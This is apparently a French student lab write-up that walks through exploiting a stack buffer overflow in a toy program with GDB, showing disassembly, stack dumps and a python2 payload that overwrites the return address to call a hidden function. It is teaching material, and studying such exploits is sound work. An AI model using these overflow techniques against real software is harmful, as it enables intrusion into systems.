# Exercice 2

### Consignes
- Téléchargez le fichier goodstudent3.c depuis moodle
- Compilez-le avec la commande :
```bash
gcc -g -fno-stack-protector -o goodstudent3 goodstudent3.c
```
- Utilisez un buffer overflow pour exécuter la fonction yes. 

### Marche à suivre

- Compiler le fichier "goodstudent3.c"
```bash
gcc -g -fno-stack-protector -o goodstudent3 goodstudent3.c
```
- Ouvrir le fichier "goodstudent3" avec GDB
```bash
gdb goodstudent3
```
- Lancer le programme
```bash
run
```
- Entrer l'input test
```bash
test
```
- Disassembler check
```bash
disass check
```
```bash
Dump of assembler code for function check:
   0x0000555555555195 <+0>:     push   %rbp
   0x0000555555555196 <+1>:     mov    %rsp,%rbp
   0x0000555555555199 <+4>:     sub    $0x20,%rsp
   0x000055555555519d <+8>:     lea    -0x20(%rbp),%rax
   0x00005555555551a1 <+12>:    mov    %rax,%rdi
   0x00005555555551a4 <+15>:    mov    $0x0,%eax
   0x00005555555551a9 <+20>:    call   0x555555555060 <gets@plt>
   0x00005555555551ae <+25>:    lea    -0x20(%rbp),%rax
   0x00005555555551b2 <+29>:    lea    0xe63(%rip),%rdx        # 0x55555555601c
   0x00005555555551b9 <+36>:    mov    %rdx,%rsi
   0x00005555555551bc <+39>:    mov    %rax,%rdi
   0x00005555555551bf <+42>:    call   0x555555555030 <strcasecmp@plt>
   0x00005555555551c4 <+47>:    leave
   0x00005555555551c5 <+48>:    ret
End of assembler dump.
```
- Breakpoint à l'adresse de gets
```bash
break *0x00005555555551a9
```
- Breakpoint à l'adresse de lea
```bash
break *0x00005555555551ae
```
- Lancer le programme
```bash
run
```
- Afficher les infos de la frame
```bash
info frame
```
```bash
Stack level 0, frame at 0x7fffffffdd80:
 rip = 0x5555555551a9 in check (goodstudent3.c:17); saved rip = 0x5555555551f3
 called by frame at 0x7fffffffdda0
 source language c.
 Arglist at 0x7fffffffdd70, args: 
 Locals at 0x7fffffffdd70, Previous frame's sp is 0x7fffffffdd80
 Saved registers:
  rbp at 0x7fffffffdd70, rip at 0x7fffffffdd78
```
- Afficher le contenu de buffer
```bash
x/8xg buffer
```
```bash
0x7fffffffdd50: 0x64757473646f6f67      0x4c4f430033746e65
0x7fffffffdd60: 0x00007fffffffdea8      0x00007ffff7ffe2d0
0x7fffffffdd70: 0x00007fffffffdd90      0x00005555555551f3
0x7fffffffdd80: 0x00007fffffffdea8      0x0000000100000000
```
- Continue
```bash
continue
```
- Lancer le programme avec input python
```bash
run <<< $(python2 -c "print 'A'*40 + '\x69\x51\x55\x55\x55\x55\x00\x00'")
```
- Afficher le contenu de rsp
```bash
x/8xg $rsp
```
```bash
0x7fffffffdd50: 0x64757473646f6f67      0x4c4f430033746e65
0x7fffffffdd60: 0x00007fffffffdea8      0x00007ffff7ffe2d0
0x7fffffffdd70: 0x00007fffffffdd90      0x00005555555551f3
0x7fffffffdd80: 0x00007fffffffdea8      0x0000000100000000
```
- Continue
```bash
continue
```
- Afficher le contenu de rsp
```bash
x/8xg $rsp
```
```bash
0x7fffffffdd50: 0x4141414141414141      0x4141414141414141
0x7fffffffdd60: 0x4141414141414141      0x4141414141414141
0x7fffffffdd70: 0x4141414141414141      0x0000555555555169
0x7fffffffdd80: 0x00007fffffffde00      0x0000000100000000
```
- Continue
```bash
continue
```

### Résultat
```bash
Yes you are!
```